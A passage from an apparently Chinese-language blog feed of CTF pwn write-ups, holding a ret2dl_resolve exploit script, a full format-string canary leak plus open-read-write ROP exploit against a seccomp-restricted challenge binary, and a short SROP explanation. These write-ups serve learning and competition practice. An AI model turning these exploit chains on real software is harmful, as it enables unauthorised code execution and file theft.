class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">proc=&#x27;./bof&#x27;</span><br><span class="line">elf=ELF(proc)</span><br><span class="line">p=process(proc)</span><br><span class="line">elf=ELF(proc)</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">read=elf.plt[&#x27;read&#x27;]</span><br><span class="line">bss=0x804c024#readelf -S bof查看所有的段的地址</span><br><span class="line">ppp_ret=0x08049331#ROPgadget</span><br><span class="line">leave_ret=0x08049145</span><br><span class="line">pop_ebp=0x08049333</span><br><span class="line">stack_size=0x800</span><br><span class="line">stack_start=bss+stack_size</span><br><span class="line">buf_size=0x6c+4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> buf_size*b&#x27;a&#x27;</span><br><span class="line">,p32(read)+p32(ppp_ret)#弹出三个参数</span><br><span class="line">,p32(0)+p32(stack_start)</span><br><span class="line">,p32(100)</span><br><span class="line">,p32(pop_ebp)#栈迁移</span><br><span class="line">,p32(stack_start)</span><br><span class="line">,p32(leave_ret)</span><br><span class="line">)</span><br><span class="line">p.sendlineafter(b&#x27;Welcome to the last stackoverflow&#x27;,payload)</span><br><span class="line"></span><br><span class="line">sleep(1)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">plt_0=0x8049030</span><br><span class="line">rel_plt=0x8048388</span><br><span class="line">dynsym=0x8048248</span><br><span class="line">str_tab=0x80482D8</span><br><span class="line">cmd=b&#x27;/bin/sh\0&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">align=0x10-(stack_start+28-dynsym)%0x10</span><br><span class="line">fake_sym_addr=stack_start+28+align</span><br><span class="line">r_info=(((fake_sym_addr-dynsym)//16)&lt;&lt;8)|0x7</span><br><span class="line">fake_puts=flat(p32(puts_got),p32(r_info))</span><br><span class="line"></span><br><span class="line">str_addr=fake_sym_addr+0x10</span><br><span class="line">st_name=str_addr-str_tab</span><br><span class="line"></span><br><span class="line">reloc_arg=stack_start+20-rel_plt</span><br><span class="line">fake_sym=flat(p32(st_name),p32(0)*2,p32(0x12))</span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> b&#x27;a&#x27;*4#这个给leave指令后的pop ebp，实际从下面开始执行</span><br><span class="line">,p32(plt_0)</span><br><span class="line">,p32(reloc_arg)</span><br><span class="line"></span><br><span class="line">,p32(stack_start+92)*2</span><br><span class="line">,fake_puts</span><br><span class="line">,align*b&#x27;a&#x27;</span><br><span class="line">,fake_sym</span><br><span class="line">,b&#x27;system\0&#x27;</span><br><span class="line">)</span><br><span class="line">print(st_name)</span><br><span class="line">payload=payload.ljust(92,b&#x27;a&#x27;)</span><br><span class="line">payload+=cmd </span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/19/NBuOMalU5tvi9JL.png" alt="ret2dl_resolve_3.png"></p><p>完结撒花，开始学堆。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;有这么一个漏洞，他能在程序不提供任何输出函数的情况下执行&lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;，没错，他就是&lt;code&gt;ret2dl_resolve&lt;/code&gt;，这个我也认为是栈溢出的最后一关了，因此我现在就算是栈溢出毕业了吧hhhh。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>canary保护学习报告:通过字符串泄露canary</title>
    <link href="http://example.com/2021/07/15/%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn1%20writeup/"/>
    <id>http://example.com/2021/07/15/%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn1%20writeup/</id>
    <published>2021-07-15T02:00:00.000Z</published>
    <updated>2021-10-25T04:27:35.492Z</updated>
    
    <content type="html"><![CDATA[<p>据学长说，那一次的ctf出题人一句“我就没打算让pwn有解”让全场所有pwner直呼内行，pwn1看似简单实则在比赛过程中能出比赛也快结束了。</p><span id="more"></span><h2 id="分析elf确定大概思路"><a href="#分析elf确定大概思路" class="headerlink" title="分析elf确定大概思路"></a>分析elf确定大概思路</h2><p>IDA打开分析elf文件</p><p><code>main()</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  __int16 *v5; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int16 v6; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+12h] [rbp-2Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+13h] [rbp-2Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  __int16 v10; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+1Ah] [rbp-26h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+1Bh] [rbp-25h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  __int16 v14; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+22h] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+23h] [rbp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  __int16 v18; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [rsp+2Ah] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [rsp+2Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v22; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v22 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = <span class="number">32</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">21</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">1</span>;</span><br><span class="line">  v13 = <span class="number">59</span>;</span><br><span class="line">  v14 = <span class="number">6</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v18 = <span class="number">6</span>;</span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  v21 = <span class="number">2147418112</span>;</span><br><span class="line">  v4 = <span class="number">4</span>;</span><br><span class="line">  v5 = &amp;v6;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v4);</span><br><span class="line">  welcome(<span class="number">22LL</span>, <span class="number">2LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>别的可能会有些许差异，但是它调用了<code>prctl</code>函数我们就要有所警惕了，就要想它应该开了沙箱保护。用<code>seccomp-tools</code>查<code>elf</code>的沙箱保护，发现该elf禁用了<code>execve</code>系统调用。</p><p><img src="https://i.loli.net/2021/07/15/FrlJvebK4ugTW63.png" alt="zjctf pwn1_1.png"></p><p>这个保护的开启就相当于断绝了我们调用<code>system</code>的绝大部分的命令，诸如<code>/bin/sh</code>或者是<code>cat flag</code>这类的。对于这个我们也是有应对措施的，那就是<code>orw</code>(<code>open</code>-<code>read</code>-<code>write</code>的缩写)。这一题很明显就是要我们用这个方法去获取<code>flag</code>了。</p><h2 id="寻找漏洞点"><a href="#寻找漏洞点" class="headerlink" title="寻找漏洞点"></a>寻找漏洞点</h2><p>确定好思路之后进<code>welcome()</code>函数寻找漏洞点。</p><p><img src="https://i.loli.net/2021/07/15/p7gRyNJAQ18sIZm.png" alt="zjctf pwn1_2.png"></p><p>很明显存在格式化字符串漏洞和栈溢出漏洞，而plt表段存在<code>_stack_chk_fail</code>函数，那就是开了<code>canary</code>保护，那么我们肯定是先利用格式化字符串任意读的特性泄露<code>canary</code>，再栈溢出。</p><h3 id="canary偏移确定"><a href="#canary偏移确定" class="headerlink" title="canary偏移确定"></a>canary偏移确定</h3><p>首先是看字符串相对于格式化字符串第一个参数的偏移。因为<code>buf</code>刚好在<code>welcome</code>函数的缓冲区顶部，因此很容易可以猜测<code>buf</code>距离第一个参数差了6*8个字节，因为它们中间隔了5个寄存器。然后<code>buf</code>到栈底又有<code>0xb0</code>个字节，而canary就在rsp-8的位置上。综上所述，canary应该在printf除了格式化字符串参数以外的第<code>(6x8+0xb0-8)/8=27</code>，所以第一次的<code>payload</code>我们就给<code>%27$p</code>，看看输出的是不是<code>canary</code>有如下特性：</p><p>①随机性，每次运行差别都会很大</p><p>②最低位字节永远为\0</p><p><img src="https://i.loli.net/2021/07/15/SCzM9NT2cauwPOo.png" alt="zjctf pwn1_3.png.png"></p><p>多次测试发现均符合上面两个特性，因此canary就被泄露出来了。</p><p>我们接收的是数字组成的字节，因此我们会接收到16个16进制的数，然后字节转成数值后用p64转为字节就可以利用<code>canary</code>了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;%27$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Welcome! What is your name?&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=p64(<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>))</span><br></pre></td></tr></table></figure><p>这就是第一步的<code>payload</code></p><h2 id="栈溢出泄露libc"><a href="#栈溢出泄露libc" class="headerlink" title="栈溢出泄露libc"></a>栈溢出泄露libc</h2><p>题目中存在输出函数<code>puts</code>。</p><p>这个用一般的payload就可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(buf_size-<span class="number">8</span>)+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+P64(pop_rdi)+p64(puts_got)+p64(puts)+p64(welcome)</span><br></pre></td></tr></table></figure><p>泄露完成之后记得重新执行<code>welcome</code>实现二次溢出执行一些libc的函数，因为我们不需要<code>system</code>，只需要<code>orw</code>，在已有的函数中就缺一个<code>open</code>函数。找到偏移得到open的真实地址。因为我只能本地复盘，又没有加载它给的libc，因此偏移只能是我自己本地调试是多少就是多少了。</p><h2 id="open函数的调用"><a href="#open函数的调用" class="headerlink" title="open函数的调用"></a>open函数的调用</h2><p>open函数只需要两个就能完成，一个是<code>&quot;flag&quot;</code>或者是<code>&quot;flag.txt&quot;</code>，另一个参数就是<code>&quot;r&quot;</code>或者是0。而只有栈是我们可读可写可以随意控制的，因此我们还需要泄露栈地址。泄露栈地址与泄露canary思路是一样的，可以用格式化字符串的任意写和C字符串的判定方式来泄露存储在栈中的<code>rbp</code>，这里已经有了格式化字符串漏洞，因此我们可以在<code>payload1</code>加上一个格式化字符来多泄露一个<code>rbp</code>。</p><p><code>gdb</code>是个好东西，用它来调试一下。因为我们的<code>rop</code>链是执行到<code>welcome</code>的那个地方才是栈底，所以我们泄露那边的<code>rsp</code></p><p><img src="https://i.loli.net/2021/07/16/pjHAqX3LF6T5iM7.png" alt="zjctf pwn1_4.png"></p><p>那边的<code>rbp</code>刚好是我们新的<code>welcome</code>函数的栈底，讲的通俗点上面就是<code>canary</code>了。</p><p>所以我们的payload和对应的接受输出的措施就可以改成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;%27$p %31$p&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=p64(<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">rbp=<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>然后我们就可以在下一次的<code>payload</code>里面输入<code>flag</code>字符串并且根据地址去引用它。首先还是老样子把<code>canary</code>泄露出来，然后<code>open</code>函数去打开<code>flag</code>文件。这里我的做法是把<code>flag</code>输出到了后面，但其实可以在前面就把<code>flag</code>字符串放上去，那样偏移还是固定的，而放在后面的话还得根据<code>rop</code>链的长度判断地址。但是思路是这么个思路，可以想一下万一缓冲区没给够，还得输出在后面的时候该用什么措施应对。这里有一个很好用的东西就是<code>ljust</code>固定<code>rop</code>链大小然后再去写。</p><p>这里我给了<code>0xb0</code>的长度去写rop链，先一步步来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=payload=<span class="number">0x68</span>*<span class="string">b&#x27;a&#x27;</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+(p64(pop_rsi_pop)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(op)</span><br><span class="line">).ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;a&#x27;</span>)+<span class="string">b&#x27;flag\0&#x27;</span></span><br></pre></td></tr></table></figure><p>这一部分输入之后<code>gdb</code>调试看看能不能成功打开<code>flag</code>文件。</p><p><img src="https://i.loli.net/2021/07/16/3cn94oHrGYumJR5.png" alt="zjctf pwn1_5.png"></p><p>可以看到已经成功把<code>rdi</code>的值变成了<code>flag</code>字符串了，后面一步也是直接执行了<code>open</code>函数。接着调试发现<code>open</code>返回值为3，说明该文件描述符为3，等一下<code>read</code>里面的<code>fd</code>参数就应该给3了。因为这里有三个参数，前两个寄存器的gadget很容易找得到，第三个rdx相关的gadget是死活找不到。这样的话有三种应对措施</p><p>①ret2csu，这个方法套一下模板和容易就可以执行了这个read。</p><p>②去libc中找到rdx相关的gadget，这是官方放出的wp的思路。</p><p>③我另辟蹊径，开辟出第三种方法，这个是一个小技巧，可以记一下：在调用<code>strcmp</code>函数的时候，rdx的值会变成两个字符串中第一个不同字符的第二个字符串对应位置的<code>ascii</code>值。举个栗子，如果我调用strcmp(“aaa”,”abc”)的话，结束的时候rdx的值为’b’。</p><p>这里我用了第三种方法。那么接下来的payload就是这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="number">0x68</span>*<span class="string">b&#x27;a&#x27;</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+(p64(pop_rsi_pop)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(op)</span><br><span class="line">+p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb9</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(strcmp)</span><br><span class="line">+p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb8</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">3</span>)+p64(read)</span><br><span class="line">).ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;a&#x27;</span>)+<span class="string">b&#x27;flag\0&#x27;</span>+<span class="string">b&#x27;a\0&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/16/IvO5gMmzlTKrU6Z.png" alt="zjctf pwn1_6.png"></p><p>继续运行下去可以发现read成功地把我本地的flag文件读到了栈上面</p><p><img src="https://i.loli.net/2021/07/16/1zQqSBaEGswuAgp.png" alt="zjctf pwn1_7.png"></p><p>最后一步应该很简单，就是把那个地方的字符串puts出来，因为在调试器里面我们能看到这个flag，但是打远程的时候我们肯定要输出出来才能看到这串flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">、payload=<span class="number">0x68</span>*<span class="string">b&#x27;a&#x27;</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+(p64(pop_rsi_pop)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(op)</span><br><span class="line">+p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb9</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(strcmp)</span><br><span class="line">+p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb8</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">3</span>)+p64(read)</span><br><span class="line">+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(puts_addr)</span><br><span class="line">).ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;a&#x27;</span>)+<span class="string">b&#x27;flag\0&#x27;</span>+<span class="string">b&#x27;a\0&#x27;</span></span><br></pre></td></tr></table></figure><p>怎么说呢？难是很难，但是确实收获很多，如果想试试这题的师傅们可以直接联系我qq找我要。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">puts=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x400943</span></span><br><span class="line">welcome=<span class="number">0x400726</span></span><br><span class="line">pop_rsi_pop=<span class="number">0x400941</span></span><br><span class="line">read=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%27$p\n%31$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;name?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=p64(<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">rbp=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp))</span><br><span class="line"></span><br><span class="line">payload=<span class="number">0x68</span>*<span class="string">b&#x27;a&#x27;</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts)+p64(welcome)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;you?&#x27;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr=(u64(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">op=puts_addr+<span class="number">0x898b0</span></span><br><span class="line">strcmp=puts_addr+<span class="number">0xff5c0</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%27$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;name?&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=p64(<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(canary)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload=<span class="number">0x68</span>*<span class="string">b&#x27;a&#x27;</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+(p64(pop_rsi_pop)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(op)</span><br><span class="line">+p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb9</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(strcmp)</span><br><span class="line">+p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb8</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">3</span>)+p64(read)</span><br><span class="line">+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(puts_addr)</span><br><span class="line">).ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;a&#x27;</span>)+<span class="string">b&#x27;flag\0&#x27;</span>+<span class="string">b&#x27;a\0&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;据学长说，那一次的ctf出题人一句“我就没打算让pwn有解”让全场所有pwner直呼内行，pwn1看似简单实则在比赛过程中能出比赛也快结束了。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="http://example.com/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"/>
    <id>http://example.com/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/</id>
    <published>2021-06-29T02:00:00.000Z</published>
    <updated>2021-10-25T05:22:41.193Z</updated>
    
    <content type="html"><![CDATA[<p>今天开始以学习了花式的栈溢出ROP攻击，BROP这个东西朴实无华且用处不大，思想能了解，但是现在谁打个pwn还不给elf呢，不给libc文件都会被喷死，还敢不给elf？因此跳过这个学习一下SROP。</p><span id="more"></span><p>SROP主要攻击方式就是针对linux系统调用的一个弱点进行攻击的，在进行系统调用的时候，内核会发出signal挂起我们正在运行的程序，并且保存上下文（上下文即所有寄存器的值），然后这个上下文还是以一个结构体的形式存在于栈里面的。此时从用户态切换到内核态，说明现在在执行系统调用，执行完成系统调用的时候会进行系统调用的返回，这个返回又要调用15号的系统调用，恢复上下文并且切换到用户态。这样子系统调用的方法有一个弱点就是，如果我控制了栈，在它挂起的时候我偷偷修改rip=syscall,rax=59(execeve的系统调用号),rdi=”/bin/sh”,rsi=0,rdx=0。那么在结束系统调用的时候就会执行execeve(“/bin/sh”)打开一个shell。</p><p>在就是说在结束系统调用的时候会进行这么一个系统调用，那么如果我本身没有系统调用而调用了这个系统调用会怎么样呢？答案是还会把栈顶的上下文给返回，当然没有精心构造过栈而直接调用肯定是会出错的。攻击的时候我就让它准备好dl_sigreturn的系统调用，然后在预期的栈顶构造一个只执行execeve(“/bin/sh”)的上下文，那么就可以直接完成打开shell的攻击。</p><p>以上都是我根据srop以及一些师傅的资料自己理解的，如有错误那挺正常的，也请师傅们能指出我的错误，感激不尽。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天开始以学习了花式的栈溢出ROP攻击，BROP这个东西朴实无华且用处不大，思想能了解，但是现在谁打个pwn还不给elf呢，不给libc文件都会被喷死，还敢不给elf？因此跳过这个学习一下SROP。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>2021华东南赛区国赛线下赛</title>
    <link href="http://example.com/2021/06/19/%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
    <id>http://example.com/2021/06/19/%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/</id>
    <published>2021-06-19T14:00:00.000Z</published>
    <updated>2021-10-17T14:38:41.454Z</updated>
    
